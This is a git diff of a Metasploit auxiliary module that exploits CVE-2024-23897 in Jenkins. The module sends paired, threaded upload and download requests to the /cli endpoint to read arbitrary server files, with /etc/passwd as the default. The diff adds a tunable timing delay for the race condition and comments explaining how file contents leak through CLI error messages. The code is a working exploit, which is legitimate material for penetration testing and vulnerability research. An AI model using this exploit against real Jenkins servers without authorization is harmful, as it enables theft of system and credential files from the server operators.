@@ -11,22 +11,17 @@ class MetasploitModule < Msf::Auxiliary
     super(
       update_info(
         info,
-        # The Name should be just like the line of a Git commit - software name,
-        # vuln type, class. Preferably apply
-        # some search optimization so people can actually find the module.
-        # We encourage consistency between module name and file name.
-        'Name' => 'Sample Webapp Exploit',
+        'Name' => 'Jenkins cliConnect Arbitrary File Read',
         'Description' => %q{
           docker run -p 8080:8080 -p 50000:50000 jenkins/jenkins:2.440-jdk17
         },
         'License' => MSF_LICENSE,
-        # The place to add your name/handle and email.  Twitter and other contact info isn't handled here.
-        # Add reference to additional authors, like those creating original proof of concepts or
-        # reference materials.
-        # It is also common to comment in who did what (PoC vs metasploit module, etc)
         'Author' => [
           'h00die', # msf module
-          'Yaniv Nizry' # discovery
+          'Yaniv Nizry', # discovery
+          'binganao', # poc
+          'h4x0r-dz', # poc
+          'Vozec' # poc
         ],
         'References' => [
           [ 'URL', 'https://www.jenkins.io/security/advisory/2024-01-24/'],
@@ -36,15 +31,10 @@ class MetasploitModule < Msf::Auxiliary
           [ 'URL', 'https://github.com/Vozec/CVE-2024-23897'],
           [ 'CVE', '2024-23897']
         ],
-        # from lib/msf/core/module/privileged, denotes if this requires or gives privileged access
-        'Privileged' => false,
         'Targets' => [
           [ 'Automatic Target', {}]
         ],
         'DisclosureDate' => '2024-01-24',
-        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
-        # It's generally easiest just to put the default at the beginning of the list and skip this
-        # entirely.
         'DefaultTarget' => 0,
         'Notes' => {
           'Stability' => [ CRASH_SAFE ],
@@ -56,11 +46,15 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
     )
-    # set the default port, and a URI that a user can set if the app isn't installed to the root
     register_options(
       [
         OptString.new('TARGETURI', [true, 'The base path for Jenkins', '/']),
         OptString.new('FILE_PATH', [true, 'File path to read from the server', '/etc/passwd']),
+      ]
+    )
+    register_advanced_options(
+      [
+        OptFloat.new('DELAY', [true, 'Delay between first and second request', 0.01]),
       ]
     )
   end
@@ -101,7 +95,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def upload_request(uuid)
     # send upload request asking for file
-    Rex::ThreadSafe.sleep(0.01) # this sleep seems to be the magic to get the download request to hit very slightly ahead of the upload request
+
+    # In testing against Docker image on localhost, .01 seems to be the magic to get the download request to hit very slightly ahead of the upload request
+    # which is required for successful exploitation
+    Rex::ThreadSafe.sleep(datastore['DELAY'])
     res = send_request_cgi(
       'uri' => normalize_uri(target_uri.path, 'cli'),
       'method' => 'POST',
@@ -110,7 +107,6 @@ class MetasploitModule < Msf::Auxiliary
       'headers' => {
         'Session' => uuid,
         'Side' => 'upload'
-        # "Content-type": "application/octet-stream"
       },
       'vars_get' => {
         'remoting' => 'false'
@@ -125,6 +121,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def process_result
+    # the output comes back as follows:
+
+    # ERROR: Too many arguments: <line 2>
+    # java -jar jenkins-cli.jar help
+    #   [COMMAND]
+    # Lists all the available commands or a detailed description of single command.
+    #   COMMAND : Name of the command (default: <line 1>)
+
+    # The main thing here is we get the first 2 lines of output from the file.
+    # The 2nd line from the file is returned on line 1 of the output, and line
+    # 1 from the file is returned on the last line of output.
+
     file_contents = []
     @content_body.split("\n").each do |html_response_line|
       # filter for the two lines which have output
@@ -166,6 +174,15 @@ class MetasploitModule < Msf::Auxiliary
     uuid = SecureRandom.uuid
 
     print_status("Sending requests with UUID: #{uuid}")
+
+    # Looking over the python PoCs, they all include threading however
+    # the writeup, and PoCs don't mention a timing component.
+    # However, during testing it was found that the two requests need to
+    # his the server nearly simultaneously, with the 'download' one hitting
+    # first. During testing, even a .1 second slowdown was too much and
+    # the server resulted in a 500 error. So we need to thread these to
+    # execute them fast enough that the server gets both in rapid succession
+
     threads = []
     threads << framework.threads.spawn('CVE-2024-23897', false) do
       upload_request(uuid)
@@ -179,6 +196,7 @@ class MetasploitModule < Msf::Auxiliary
     rescue StandardError
       nil
     end
+
     if @content_body
       process_result
     else
